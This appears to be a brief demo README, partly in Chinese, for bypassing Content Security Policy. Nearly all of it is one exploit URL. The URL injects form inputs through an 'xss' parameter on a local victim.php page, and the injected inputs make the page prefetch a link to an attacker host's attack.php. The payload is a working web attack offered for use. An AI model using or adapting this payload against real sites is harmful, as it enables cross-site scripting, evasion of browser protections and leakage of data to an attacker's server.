#bypass csp demo


##利用方法

```
http://localhost/csp/victim.php?xss=<input value="CLICK ME FOR POC" type="submit" formaction="" form="subscribe" formmethod="get" /><input type="hidden" name="xss" form="subscribe" value="<link rel='prefetch' href='http://*.*.*.*/attack.php'>"/>
```
##test